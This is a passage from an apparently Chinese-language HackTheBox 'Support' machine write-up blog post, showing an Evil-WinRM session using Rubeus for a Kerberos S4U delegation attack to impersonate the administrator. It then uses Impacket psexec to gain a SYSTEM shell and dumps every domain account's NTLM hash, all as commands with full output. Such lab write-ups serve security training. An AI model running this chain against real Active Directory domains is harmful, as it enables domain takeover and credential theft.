&quot;CommitChanges&quot; with &quot;0&quot; argument(s): &quot;Access is denied.</span><br><span class="line">&quot;                                 </span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe hash /password:Summer2018!                                                 </span><br><span class="line">                                                         </span><br><span class="line">   ______        _     </span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Calculate Password Hash(es)</span><br><span class="line"></span><br><span class="line">[*] Input password             : Summer2018!</span><br><span class="line">[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F</span><br><span class="line"></span><br><span class="line">[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line"></span><br><span class="line">[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F </span><br><span class="line">[*] Building AS-REQ (w/ preauth) for: &#x27;support.htb\attackersystem$&#x27;</span><br><span class="line">[*] Using domain controller: ::1:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFojCCBZ6gAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD</span><br><span class="line">      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBG0wggRpoAMCARKhAwIBAqKCBFsEggRXEiL6BRE5</span><br><span class="line">      rBNoMPYjcBWUb07+3Wo1fe9i68gpTjJE4D607Hwx6xKuyvRDdkYMFb0pCsXKg2FkXOQxxlDxXlKkN8WY</span><br><span class="line">      Aj9Fsduu600l0CV1MUicq/06o4dBax3InDJOiiFnY7e6i6wVbHucd2w6dES3bJtU2A6WCyNbeFefKV9H</span><br><span class="line">      vGmIt54LY/kuRWHOwrRuHnkVYbqlgV2ClHvFVWRbvtWRWSWhr/SVgH8+NTl2796ZgkVlMgBBJVl/0XLI</span><br><span class="line">      okFMhH8vxr5Cu9w31TVvmPxeTdL5MGltQrbBNRPJJU6ZYRvK3rYHqY9LDjt1/fYOXO97yksi+xtMcKFZ</span><br><span class="line">      ox5BoKnbdLMG2fCLhHoUGOLiE/FcG4HOFpJSYyzjT1/jV4fotMKv/iMo44uXLf/m/ybChrdZtFrtUGQg</span><br><span class="line">      8Ac2lq7QH9qQr4/YQ1fb+dVahK0vmRrceSN6BMnPAK9x7mrXh7meX9PuRvogQxB4uggqHPPa+hvXspeF</span><br><span class="line">      T5LN0hrf6Vy80kFCGl/037prp21idy2unELWRVNiH+yBGCw2ebbrRZWRFnAxAS9D1YdWLdwNYs+yDcSh</span><br><span class="line">      3qP5l7diOqAr0xAkeLFKKry0iWInk7pvopNlgiLU5tYv67SfduU5wTsCbivKVjWWq0oMBeIRYqFYTOS7</span><br><span class="line">      1pKzT++CHqk5pylsFdzhlIzTo7+/4thpDK7hWbXRrZ398bWbN+/xZPKZ+FmjtG2bO8d0ZmQ/RYAVD5D6</span><br><span class="line">      KKIY2Ayc6EMllGaoIibfpVd7sDtfZh4WwCrUI+lAT3Eq0oTy+BsQL79mU2qSWVdITMenllIMnyf4gF15</span><br><span class="line">      Z4bTDJGCCbqDo4W8TJt+wE/9dwdMbMn+E+dxbf3ZVvalj+as9iMszNFXzlNn118gPSRlGac4zNhSA6ys</span><br><span class="line">      4nDfVqhYGBLqzsKzvC9Nm0Izat53hiYUShbMvV0sorNn2BqSEU1fxrYAdg3ZGdMLBTBSLOeatRLSa1LR</span><br><span class="line">      oWPFevv0OnyymVN2ykm4zVvwYFo6a1KzTiFepn1e1glVRr7tPofRCU3GXuYnevVr+0V0fX6kB/93CnyZ</span><br><span class="line">      BY+jcJR9ltH0oVXHtLOR8vkRZvwRuxVdKoHJEjrsrVIag6fF4TLKOn1+yd8V5dxDu0r5BfxULMCRsoiQ</span><br><span class="line">      Xh1Pyc2Msg1vKC/AuLltQBnLY+oPfQmqWJO2VbLpM/ClMggE8LtTFlwsITJ9RRHsLE2hXyEfmbR9WINV</span><br><span class="line">      o73wDPfq+vcmjikRNY/Ltq3Y98X/4dBXZxncSRpzDqpZGbKvN4edy41+EU/vfnNTjyn6mWaymGMdFk4x</span><br><span class="line">      0gcBe9gFxctMzrxcgME6yh/h+j/E8FGV96FX4uxpwXO2Dxo7EkcWdRLuVKit9q7Xi7SlRUqRTVQB7FUa</span><br><span class="line">      jvpL7BAgsGbEQomG4NcPgdoI2/Rz9rmTT0d0N8zKILOC5uiWZnmyUkWh7rtI4n2xS40iEhXMDtCVwefD</span><br><span class="line">      qlXhVZkeDGGisydSzz0mxggmyZXizyESZaOB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBsw</span><br><span class="line">      GaADAgEXoRIEECwibmu541scxclficDwDnmhDRsLU1VQUE9SVC5IVEKiHDAaoAMCAQGhEzARGw9hdHRh</span><br><span class="line">      Y2tlcnN5c3RlbSSjBwMFAEDhAAClERgPMjAyNTA0MDMwODIwNTVaphEYDzIwMjUwNDAzMTgyMDU1WqcR</span><br><span class="line">      GA8yMDI1MDQxMDA4MjA1NVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv</span><br><span class="line">      cnQuaHRi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: S4U</span><br><span class="line">[*] Building S4U2self request for: &#x27;attackersystem$@SUPPORT.HTB&#x27;</span><br><span class="line">[*] Using domain controller: dc.support.htb (::1)</span><br><span class="line">[*] Sending S4U2self request to ::1:88</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[*] Got a TGS for &#x27;administrator&#x27; to &#x27;attackersystem$@SUPPORT.HTB&#x27;</span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFsjCCBa6gAwIBBaEDAgEWooIEyTCCBMVhggTBMIIEvaADAgEFoQ0bC1NVUFBPUlQuSFRCohwwGqAD</span><br><span class="line">      AgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0ko4IEhzCCBIOgAwIBF6EDAgEBooIEdQSCBHGawvYEUsnLRmjq</span><br><span class="line">      zLqXnxIBEGvIsOl15LzJzMv6FpJcMDzCfWYGjptKYPQDPYif6g6Swt8VMxsovNDNJ3yOjhVrFQ+zVfNj</span><br><span class="line">      FOHeNMU2i0DjItQpjiIlfwdJ0md6qyJWcbrmbmyVYAYD2L7bIFi8Lpb+JGbPifEW95U9ze1kv39otMgJ</span><br><span class="line">      B4m4CWcXMlIL7DRDIQJydeUHLY0f2aoiOsXRtinsArABTdEvq4d0Sw5wgzRMUhPqvhrlPJAaTnIAhJk8</span><br><span class="line">      sTW0EREOFF06hVJcjRrO3hBna6ERWiMo2o6HU49ZKl3sUuNV4U9CG7Ji0xaVsqfamWI5EdrYKOIcA0UW</span><br><span class="line">      PnaLRpewZe2wgKEJ8tKKHBSTeUKJ4Ln+uFk2UWgQywV++CmNcgdMTbngHSNZGUwe6frw04MlTrsWGmy/</span><br><span class="line">      Z7YGVnvt5E77j5QMI9j66wWZghPxNunMBr7SZ1E8dZNEK/3HM8cnegz5RRXax+uGvw9dQi/4MLLia2wg</span><br><span class="line">      zNxS3Vf+9wTWpHmWm4X8HwoyhZNoP7qPLc5jfFfDYQeaDXBLJFoHN1AVZpbZx0UeNsMI+LXkC8xpdDzA</span><br><span class="line">      a2/mU3KZJyvIi6fdJQRIgRXpILmyDuW1F7Nv256Ws9vW2GDBvhDbs5Yah7cuX/jmfIx6umrKExeKWHoB</span><br><span class="line">      Xmg1Cc6sjlarCkaqbfgVZ4baLxMz6nC67wh1fdYxCLIls7sypYj4B4rANg4uPj+riiaRLHJVWcAeXOvw</span><br><span class="line">      zk1uZRz3/SdB9+kwmdybWMBxP5tIDcukl3K3F8gsAa8/YA0Hd16Z4DRhU9fZE0UpwwrPOJX4NZBjM+Z9</span><br><span class="line">      whJnZJhr3sHJ+vkMKKZrF2kSv9HyF6CmUnATDJej+Co4ad33mr9AocZfU8qHI0IBaepdJn24kGI3ye6L</span><br><span class="line">      GKo+wQzuXfKnBj2CHRbfZ9WbwcTtWi12uy4UNaSKr93NeICN8wQUAyThGKxKYHwaEuQfJXg1/FCc7MCO</span><br><span class="line">      lke08iOjTsqrkPO9sc4UMbSWLqEKl8CatjUvT0CB7N6d1CKxOEuE7D6nWnWEDJluIhHhYNOyWBhTJXO0</span><br><span class="line">      SaLes7hwlHBPkQfD3lN7JZmu749kawJvkYIQscHCmZEDqZd8FIU9Mv41jFxwcVl6PJd9ITQfknWYOspk</span><br><span class="line">      kKe9sgXrdsHEnL4C9lbZI22WQJtPqC/UfMHLmL/0fsU/FAoqNGyhkx6/e+Hj8cloHRH6gc8ljtaGdJ8n</span><br><span class="line">      kJSdQ9TDUR/H1eEaxnxLRFAqxaE+9/6rL+GAPXx7OLD5AUw+wrE05yBXFC4W0JzMofOzqSDMpj25uutc</span><br><span class="line">      9IiSOVZpcexFXEK8WboN8xsHjautyA7Et+owxglomFKdSniIwjn5QscCfZYk9ta2u1IGE5/HcKL0dAVZ</span><br><span class="line">      zFR+8GwRHhLeG4lGI88K56YMJrFRuDgGZSMll9R+tD/4o2/BQ8RSfppjbO1ckWeB4THP3J4k1xXvWQ7v</span><br><span class="line">      NWuzSoC12nr4Nz5bZ4G/bNtNE5m+2QOyAOUZm0tm5WQTtSOumaxiKg4W0Wk0RFOjgdQwgdGgAwIBAKKB</span><br><span class="line">      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBDIivJdaItGYz/0PJ4miZFmoQ0bC1NVUFBPUlQu</span><br><span class="line">      SFRCohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDI1MDQwMzA4MjA1NVqm</span><br><span class="line">      ERgPMjAyNTA0MDMxODIwNTVapxEYDzIwMjUwNDEwMDgyMDU1WqgNGwtTVVBQT1JULkhUQqkcMBqgAwIB</span><br><span class="line">      AaETMBEbD2F0dGFja2Vyc3lzdGVtJA==</span><br><span class="line"></span><br><span class="line">[*] Impersonating user &#x27;administrator&#x27; to target SPN &#x27;cifs/dc.support.htb&#x27;</span><br><span class="line">[*] Building S4U2proxy request for service: &#x27;cifs/dc.support.htb&#x27;</span><br><span class="line">[*] Using domain controller: dc.support.htb (::1)</span><br><span class="line">[*] Sending S4U2proxy request to domain controller ::1:88 </span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line">[*] base64(ticket.kirbi) for SPN &#x27;cifs/dc.support.htb&#x27;:</span><br><span class="line">      doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD</span><br><span class="line">      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQaiggUpBIIFJcpgFR8a</span><br><span class="line">      QxNQCXubyEAIHv0fSJFrMSw9+0Xp8/sRGn0bW3/olLH4PetL5JBt10IIiKpWQO3JONmWD8Di5f+/5Y+6</span><br><span class="line">      AlU+oN7DVsSjcJBld/e/YbvwH9PJJI/hYneZN6LpUiIDC/qO9bW3EbPqzXbsfjaUpSz4gjhdcqu+IXcn</span><br><span class="line">      sb/oWVjzlYMfpbYSknTFhnMsv3K9nlwl6+97wrdq6lsSx/aNi1OndH/PgZ4S4Pc5OAkExCHnK0J5XCSm</span><br><span class="line">      kJ44DUJF67Lu0JXma0p0ADBjXqINtRMS/SUqa5yDk+eDP2y6uRyoxKfPhJ+8OJeXV4Cdx1rxEaWl5Xjb</span><br><span class="line">      xCSY3fQdQU1dtBM95St/QYjA71Eaxt5+4mex3jFFKt9gUDVI952WCQU83hf7NgF7+o/Fv1CB76wsjUEP</span><br><span class="line">      ermNQ6VgANDN1hDnHzOjEgA1qxy3GbVQGcuF2SGkYlpOabLLa0TKc1qgP9wVFIZPtYvSzQkYnlYnym8e</span><br><span class="line">      pFl5u8TR94VTGpledj9D23ZT5LWCfdOp+Yv6+RSqAopLzbzTY/N3QjBAbiFdhkqJaqouda8ZH0CRWwvC</span><br><span class="line">      AxZqq9m8qK/MbCe9OvkiZJ442lsXUE1iltd8AJoe78R6I7IuyA+/UdEYBmVawNTNllKtBDPy9J9dLAFp</span><br><span class="line">      ztkzU/bpt7uFIOYBiAuNUt4KmI9pM58wi0iA2Oz0JJySqmbkyF38phJjgPQ17d7fmB19kglQXNpzC6fr</span><br><span class="line">      +7U/5VPyFo8bhHYqWbprTMIUIig05puJy66ytCFrMDTpykzG3g96grr6paBfv1WuITUbTpP29yldZKNE</span><br><span class="line">      D+0diNVHeySfJM+GMhpv5TO5XNDAOG/3l6o4w+4Eledhb1VCaqMWbCkUEAoacPhKiu7sffKWhTRe8P8h</span><br><span class="line">      x+WonFv5p7AxRH8I/ehgdCCxlQwnkXZrDLH6x8tYPVBIW5kJmHTfN0oVuOKfNaEvvrVJrfDt8ze+ZHn1</span><br><span class="line">      faM1D/qZj/zrGQBgfAYooZv9NHIz0bJ29YDO95KSTdUeeGYRG3LyNM1WbfOoZlxj5o9wqLlMDOMYjeIc</span><br><span class="line">      CbnqzaHQMVzWCHNdfAGX+TsTV+jXaX1ODiGZ9AztM5y8MBoNj+cbmR+VU6YsaJqfSdzKWpBqi6vF2fB2</span><br><span class="line">      KAL0cMH+ET7SawQJPQaYvFODFipo0Be0j5PD1re/lGOM4AlduXhRnuO7J8K9q3m0s3VjyZ49dmAQy0Cn</span><br><span class="line">      HEaBCrKNW7E6v101PbCrSLMVvLQEsdKNvO4YyZlb7Ny5YOPCjVL6qLJtIzbWIkCJICXvnb5kxIjsJ8WH</span><br><span class="line">      x3Bb3UvRG5JAL6K8JsU/iqajFYk+Ip5qhqqIN0XeR6ZqgrfwLKkc6YEBFMLyXgBMdccIfDHzE3VxGtWf</span><br><span class="line">      TH+bbEd3ulqnqxtkv3KKIGZceyTLpaogIMaV17Rr207aumrTpryoMuNVTocnHy2XrOJ3Ogcm7GhN7woy</span><br><span class="line">      ToTeEc3q/inRjLD/KRcJXcfgZdjgRZfYg1lZCwASwrtkYlD8i1jzMqxAQJiLzXQJptLMbm1hzoDH2lF7</span><br><span class="line">      5Yy6ZNrDPbs6nzzsQNah3YNxJfAtuAd+bMfuAyed1UcvQFlTgIW5MJRfJnj/mNNrqbLtzXIjxpr4+1Lf</span><br><span class="line">      qR1qQ+wNVhMPfQduhN/VdjZRC3eSyZGdvWnM++UXF9aTFiu9j3L0x/d8+OJpjy7qKAGyWtDEfesSWNJE</span><br><span class="line">      seyTLmLH0aABwmm4zCWMJRpGoDCt1JbvoprH+frDZt9UyLDUfgu658KTXYzooga/o7UWYqOB2TCB1qAD</span><br><span class="line">      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEENRQlhmS5+c1rHEuwqzyllihDRsLU1VQ</span><br><span class="line">      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjUwNDAzMDgy</span><br><span class="line">      MDU1WqYRGA8yMDI1MDQwMzE4MjA1NVqnERgPMjAyNTA0MTAwODIwNTVaqA0bC1NVUFBPUlQuSFRCqSEw</span><br><span class="line">      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\lusowen&gt; .\Rubeus.exe klist</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (Current User)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : 0xa154c3</span><br><span class="line"></span><br><span class="line">  UserName                 : support</span><br><span class="line">  Domain                   : SUPPORT</span><br><span class="line">  LogonId                  : 0xa154c3</span><br><span class="line">  UserSID                  : S-1-5-21-1677581083-3380853377-188903654-1105</span><br><span class="line">  AuthenticationPackage    : NTLM</span><br><span class="line">  LogonType                : Network</span><br><span class="line">  LogonTime                : 4/3/2025 12:21:45 AM</span><br><span class="line">  LogonServer              : DC</span><br><span class="line">  LogonServerDNSDomain     : support.htb</span><br><span class="line">  UserPrincipalName        : support@support.htb</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 4/3/2025 1:20:55 AM ; 4/3/2025 11:20:55 AM ; 4/10/2025 1:20:55 AM</span><br><span class="line">      Server Name       : cifs/dc.support.htb @ SUPPORT.HTB</span><br><span class="line">      Client Name       : administrator @ SUPPORT.HTB</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br><span class="line">==========================================================================</span><br><span class="line">$ nano ticket.b64</span><br><span class="line">#将base64的那段编码放进去</span><br><span class="line">$ base64 -d ticket.b64 &gt; ticket.kirbi</span><br><span class="line"></span><br><span class="line">$ ticketConverter.py ticket.kirbi ticket.ccache           </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] done</span><br><span class="line"></span><br><span class="line">$ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Requesting shares on dc.support.htb.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file XUbGmpCE.exe</span><br><span class="line">[*] Opening SVCManager on dc.support.htb.....</span><br><span class="line">[*] Creating service XpwJ on dc.support.htb.....</span><br><span class="line">[*] Starting service XpwJ.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.20348.859]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; cd C:\users\administrator\desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 955A-5CBB</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">05/28/2022  04:17 AM    &lt;DIR&gt;          .</span><br><span class="line">05/28/2022  04:11 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/02/2025  11:02 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   3,933,425,664 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; type root.txt</span><br><span class="line">7a80574ef22499ca66f7699fbb5c719a</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="shell-as-nt-authority"><a href="#shell-as-nt-authority" class="headerlink" title="shell as nt authority"></a>shell as nt authority</h2><h3 id="hashes"><a href="#hashes" class="headerlink" title="hashes"></a>hashes</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::</span><br><span class="line">ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::</span><br><span class="line">support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::</span><br><span class="line">smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:24501f0c63c517085f93146df7b3bff7:::</span><br><span class="line">MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::</span><br><span class="line">lusowen$:5601:aad3b435b51404eeaad3b435b51404ee:6927391aa711001aa774ea55c915fb44:::</span><br><span class="line">attackersystem$:5602:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f:::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
        
          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-and-other-enum"><span class="toc-number">1.</span> <span class="toc-text">nmap and other enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb"><span class="toc-number">1.2.</span> <span class="toc-text">smb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt"><span class="toc-number">1.3.</span> <span class="toc-text">dnspy analyst exe and crack encrypt pass with chatgpt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap-enum-info"><span class="toc-number">1.4.</span> <span class="toc-text">ldap enum info</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-support"><span class="toc-number">2.</span> <span class="toc-text">shell as support</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-nt-authority"><span class="toc-number">3.</span> <span class="toc-text">shell as nt authority</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashes"><span class="toc-number">3.1.</span> <span class="toc-text">hashes</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&text=HackTheBox——HTB Support Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&is_video=false&description=HackTheBox——HTB Support Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Support Writeup&body=Check out this article: https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&title=HackTheBox——HTB Support Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/HackTheBox%E2%80%94%E2%80%94HTB%20Support%20Writeup/&name=HackTheBox——HTB Support Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
